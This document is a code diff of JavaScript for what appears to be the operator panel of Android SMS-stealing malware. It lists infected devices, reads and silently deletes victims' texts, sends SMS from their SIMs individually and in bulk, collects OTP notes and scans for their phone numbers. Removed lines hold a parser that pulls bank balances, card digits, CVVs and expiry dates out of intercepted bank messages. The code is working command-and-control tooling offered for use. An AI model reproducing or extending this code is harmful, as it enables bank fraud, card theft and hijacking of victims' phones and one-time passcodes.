-                    <textarea class="f-input f-area" id="smsMsg" placeholder="Type SMS content..."></textarea>
-                </div>
-
-                <button class="btn-send" onclick="execSMS()">EXECUTE PAYLOAD VIA SIM ${selSim}</button>
-            </div>`;
-        }
-    }
-}
-
-function renderMList() {
-    const d = selDev;
-    let msgs = cache[d._src+':'+d._id] || [];
-    const q = (document.getElementById('mSearch')?.value||'').toLowerCase();
-    
-    if(mf==='in') msgs = msgs.filter(m=>m.type==='incoming');
-    if(mf==='out') msgs = msgs.filter(m=>m.type==='outgoing');
-    if(q) msgs = msgs.filter(m => `${m.sender} ${m.message}`.toLowerCase().includes(q));
-
-    const html = [...msgs].reverse().slice(0,200).map(m => {
-        const isOut = m.type === 'outgoing';
-        return `
-        <div class="chat-msg">
-            <div class="chat-head">
-                <div class="chat-sender">${esc(m.sender||m.address||'Unknown')}</div>
-                <div class="chat-badge ${isOut?'out':'in'}">${isOut?'SENT':'INBOX'}</div>
-                <div class="chat-time">${esc(m.dateTime||m.date||'')}</div>
-                <div class="chat-delete" onclick="promptDeleteMsg('${m._localId}')" style="margin-left:auto; width:24px; height:24px; border-radius:4px; display:flex; align-items:center; justify-content:center; color:rgba(255,255,255,0.3); cursor:pointer; background:rgba(255,255,255,0.05); font-size:0.8rem; transition:var(--trans);" onmouseover="this.style.background='rgba(239, 68, 68, 0.2)'; this.style.color='var(--red)'" onmouseout="this.style.background='rgba(255,255,255,0.05)'; this.style.color='rgba(255,255,255,0.3)'">✕</div>
-            </div>
-            <div class="chat-body">${esc(m.message||m.body||'')}</div>
-        </div>`;
-    }).join('');
-    
-    document.getElementById('mList').innerHTML = html || emp('No messages match criteria');
-}
-
-async function execSMS() {
-    const to = document.getElementById('smsTo').value;
-    const msg = document.getElementById('smsMsg').value;
-    if(!to || !msg) return customAlert('Missing Fields', 'Please fill in both the target phone number and payload message.');
-    
-    const finalMsg = msg.replace(/\[ID\]/g, selDev._id);
-    const payload = { from: selSim, to, message: finalMsg, isSended: false };
-    const p = `/clients/${selDev._id}/webhookEvent/sendSms.json`;
-    const src = SOURCES.find(s => s.key === selDev._src);
-    const token = src ? await getAuthToken(src) : null;
-    const authSuffix = token ? `?auth=${token}` : '';
-    
-    try {
-        await fetch(selDev._base + p + authSuffix, { method: 'PUT', body: JSON.stringify(payload) });
-        customAlert('Payload Staged', `The SMS command was successfully written to the device.\n\nFinal Payload:\n"${finalMsg}"`);
-    } catch(e) { customAlert('Execution Failed', 'Failed to stage the SMS payload. Target might be offline or unreachable.'); }
-}
-
-// --- FINANCIAL INTELLIGENCE PARSER ---
-function parseFinancialSms(text, sender) {
-    if (!text || text.trim().length < 8) return null;
-    const upperText = text.toUpperCase();
-    
-    // Quick filter to see if it even looks like a financial message
-    const isFin = /AVL|AVAL|AVBL|AVAIL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|DEPOSITED|TRANSACTION|A\/C|ACCOUNT|INR|RUPEE|CARD|CVV|CREDIT|DEBIT/.test(upperText);
-    
-    // Strict filter to ignore OTPs, login verification, or sign-up texts
-    const isOTP = /OTP|VERIFICATION|CODE|PIN|PASSWORD|SIGN-UP|LOGIN/i.test(upperText);
-    
-    if (!isFin || isOTP) return null;
-    
-    let result = {
-        bankName: null,
-        availableBalance: null,
-        transactionAmount: null,
-        transactionType: null, // 'credit' or 'debit'
-        accountLast4: null,
-        cardLast4: null,
-        cardType: null,
-        cvv: null,
-        expiry: null,
-        isBankAlert: false,
-        isCardAlert: false
-    };
-
-    // 1. Identify Bank
-    for (const [regex, bank] of BANK_NAMES) {
-        if (regex.test(text) || regex.test(sender)) {
-            result.bankName = bank;
-            result.isBankAlert = true;
-            break;
-        }
-    }
-    
-    // Fallback: If no bank name matched but it has a sender ID format (e.g. AD-HDFCBK)
-    if (!result.bankName && /^[A-Z]{2}-[A-Z0-9]+$/.test(sender)) {
-        const parts = sender.match(/(?:[A-Z]{2}-)?([A-Z0-9]+)/);
-        if (parts && parts[1]) result.bankName = parts[1];
-    }
-
-    // 2. Extract Available Balance
-    for (const regex of BAL_REGEX) {
-        const match = text.match(regex);
-        if (match && match[1]) {
-            const amt = match[1].replace(/,/g, "");
-            if (parseFloat(amt) >= 0) {
-                result.availableBalance = amt;
-                result.isBankAlert = true;
-                break;
-            }
-        }
-    }
-
-    // 3. Extract Transaction Amount & Type
-    for (const regex of TXN_REGEX) {
-        const match = text.match(regex);
-        if (match && match[1]) {
-            const amt = match[1].replace(/,/g, "");
-            if (amt !== result.availableBalance) {
-                result.transactionAmount = amt;
-                break;
-            }
-        }
-    }
-    
-    if (/credit(?:ed)?/i.test(text)) result.transactionType = "credit";
-    else if (/debit(?:ed)?|withdraw|paid|purchase|spent/i.test(text)) result.transactionType = "debit";
-
-    // 4. Extract Account Number
-    for (const regex of ACC_REGEX) {
-        const match = text.match(regex);
-        if (match && match[1]) {
-            result.accountLast4 = match[1].replace(/[^0-9]/g, "").slice(-4);
-            break;
-        }
-    }
-
-    // 5. Card Intel
-    if (upperText.includes("CARD") || upperText.includes("CVV") || upperText.includes("CREDIT") || upperText.includes("DEBIT")) {
-        result.isCardAlert = true;
-        
-        // Card Last 4
-        for (const regex of CARD_REGEX) {
-            const match = text.match(regex);
-            if (match && match[1]) {
-                const num = match[1].replace(/[^0-9]/g, "");
-                if (num.length >= 4) {
-                    result.cardLast4 = num.slice(-4);
-                    break;
-                }
-            }
-        }
-        
-        // Card Type
-        if (/VISA/i.test(text)) result.cardType = "VISA";
-        else if (/MASTER(?:CARD)?/i.test(text)) result.cardType = "Mastercard";
-        else if (/RUPAY/i.test(text)) result.cardType = "RuPay";
-        else if (/AMEX|AMERICAN EXPRESS/i.test(text)) result.cardType = "Amex";
-        else if (/credit/i.test(text)) result.cardType = "Credit Card";
-        else if (/debit/i.test(text)) result.cardType = "Debit Card";
-
-        // CVV
-        for (const regex of CVV_REGEX) {
-            const match = text.match(regex);
-            if (match && match[1]) {
-                result.cvv = match[1];
-                break;
-            }
-        }
-
-        // Expiry
-        for (const regex of EXP_REGEX) {
-            const match = text.match(regex);
-            if (match && match[1]) {
-                result.expiry = match[1];
-                break;
-            }
-        }
-    }
-
-    // Only return if we found *something* useful
-    if (result.isBankAlert || result.isCardAlert) {
-        if (!result.bankName) result.bankName = "Unknown Bank";
-        return result;
-    }
-    
-    return null;
-}
 
 function esc(s) { if(s==null) return ''; const d=document.createElement('div'); d.textContent=String(s); return d.innerHTML; }
 function emp(msg) { 
@@ -2190,18 +1417,11 @@ async function saveOtpNote() {
     if (!selDev) return;
     const note = document.getElementById('otpNoteInput').value.trim();
     if (!note) return;
-    const src = SOURCES.find(s => s.key === selDev._src);
-    const token = src ? await getAuthToken(src) : null;
-    const authSuffix = token ? `?auth=${token}` : '';
 
     const paths = [`/clients/${selDev._id}/note.json`, `/${selDev._id}/note.json`];
     for (const p of paths) {
         try {
-            const res = await fetch(selDev._base + p + authSuffix, {
-                method: 'PUT',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(note)
-            });
+            const res = await proxyFirebase(selDev._src, selDev._id, p, 'PUT', note);
             if (res.ok) {
                 selDev.note = note;
                 document.getElementById('otpNoteContent').textContent = note;
@@ -2332,19 +1552,11 @@ async function editPhone(src, id) {
             d.customPh = newPh;
             filterDevs(); // re-render sidebar
             if(selDev && selDev._id === id) renderTab(); // re-render main pane
-            const srcObj = SOURCES.find(s => s.key === src);
-            const token = srcObj ? await getAuthToken(srcObj) : null;
-            const authSuffix = token ? `?auth=${token}` : '';
-            
             // Save to Firebase
             const paths = [`/clients/${id}/customPh.json`, `/${id}/customPh.json`];
             for (const p of paths) {
                 try {
-                    const res = await fetch(d._base + p + authSuffix, {
-                        method: 'PUT',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(newPh)
-                    });
+                    const res = await proxyFirebase(src, id, p, 'PUT', newPh);
                     if (res.ok) {
                         console.log(`[PANEL] Saved custom phone to ${p}`);
                         break;
@@ -2784,14 +1996,7 @@ function scanTelecom(d) {
                 d.customPh = discoveredNumber;
                 
                 // Save to proxy backend (which proxies to Firebase)
-                fetch(`/api/devices/${d._src}/${d._id}`, {
-                    method: 'PUT',
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'Authorization': `Bearer ${localStorage.getItem('token')}`
-                    },
-                    body: JSON.stringify(newDeviceData)
-                }).then(() => {
+                proxyFirebase(d._src, d._id, `/clients/${d._id}/customPh.json`, 'PUT', discoveredNumber).then(() => {
                     renderDevList();
                     renderTab();
                 });
@@ -2966,12 +2171,8 @@ async function execBulkSMS() {
         const payload = { from: bulkSim, to, message: finalMsg, isSended: false };
         const p = `/clients/${d._id}/webhookEvent/sendSms.json`;
         
-        const srcObj = SOURCES.find(s => s.key === d._src);
-        const token = srcObj ? await getAuthToken(srcObj) : null;
-        const authSuffix = token ? `?auth=${token}` : '';
-        
         try {
-            await fetch(d._base + p + authSuffix, { method: 'PUT', body: JSON.stringify(payload) });
+            await proxyFirebase(d._src, d._id, p, 'PUT', payload);
             success++;
         } catch(e) {
             failed++;
@@ -3019,14 +2220,10 @@ function startDiscoveryScan(receiverId, selectedDevices) {
         }
         
         const paths = [`/messages/${rDev._id}.json`, `/clients/${rDev._id}/messages.json`, `/sms/${rDev._id}.json`, `/clients/${rDev._id}/sms.json`];
-        const src = SOURCES.find(s => s.key === rDev._src);
-        const token = src ? await getAuthToken(src) : null;
-        const authSuffix = token ? `?auth=${token}` : '';
-        
         let allMsgs = [];
         for (const p of paths) {
             try {
-                let res = await fetch(rDev._base + p + authSuffix);
+                let res = await proxyFirebase(rDev._src, rDev._id, p, 'GET');
                 if (res.ok) {
                     let txt = await res.text();
                     if (txt && txt !== 'null') {
@@ -3071,14 +2268,9 @@ function startDiscoveryScan(receiverId, selectedDevices) {
                         matchesFound++;
                         
                         // Save to Firebase silently
-                    const tSrc = SOURCES.find(s => s.key === targetDev._src);
-                    const tToken = tSrc ? await getAuthToken(tSrc) : null;
-                    const tAuth = tToken ? `?auth=${tToken}` : '';
+                    // Save to Firebase silently
                     try {
-                        await fetch(`${targetDev._base}/clients/${targetDev._id}/customPh.json${tAuth}`, {
-                            method: 'PUT',
-                            body: JSON.stringify(sender)
-                        });
+                        await proxyFirebase(targetDev._src, targetDev._id, `/clients/${targetDev._id}/customPh.json`, 'PUT', sender);
                     } catch(e) {}
                     
                     filterDevs(); // update UI if visible
@@ -3326,16 +2518,12 @@ function promptDeleteMsg(localId) {
 async function executeDeleteMsg() {
     if(!msgToDelete) return;
     const { dev, msg } = msgToDelete;
-    const src = SOURCES.find(s => s.key === dev._src);
-    const token = src ? await getAuthToken(src) : null;
-    const authSuffix = token ? `?auth=${token}` : '';
-    
     const p = msg._fbPath.replace('.json', '') + '/' + msg._fbKey + '.json';
     const btn = document.getElementById('delMsgBtn');
     btn.innerHTML = '<div class="spinner" style="width:14px;height:14px;border-width:2px;border-top-color:#fff;"></div>';
     
     try {
-        await fetch(dev._base + p + authSuffix, { method: 'DELETE' });
+        await proxyFirebase(dev._src, dev._id, p, 'DELETE');
         let msgs = cache[dev._src+':'+dev._id];
         if (msgs) {
             cache[dev._src+':'+dev._id] = msgs.filter(x => x._localId != msg._localId);
